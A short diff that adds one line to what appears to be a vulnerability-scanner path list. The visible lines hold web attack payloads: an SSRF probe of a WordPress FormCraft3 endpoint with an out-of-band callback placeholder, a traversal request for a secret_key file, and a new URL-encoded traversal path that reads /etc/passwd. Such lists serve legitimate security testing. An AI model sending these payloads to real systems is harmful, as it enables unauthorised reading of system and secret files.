@@ -271,3 +271,4 @@
 /wp-admin/admin-ajax.php?action=formcraft3_get&URL=https://{{interactsh-url}}
 /api/v1/files/profile_pictures/../secret_key
 /guardrails/test_custom_code
+/%2F%2F%2F%2F%2F%2F%2F%2F%2F%2F%2F%2F%2F%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd
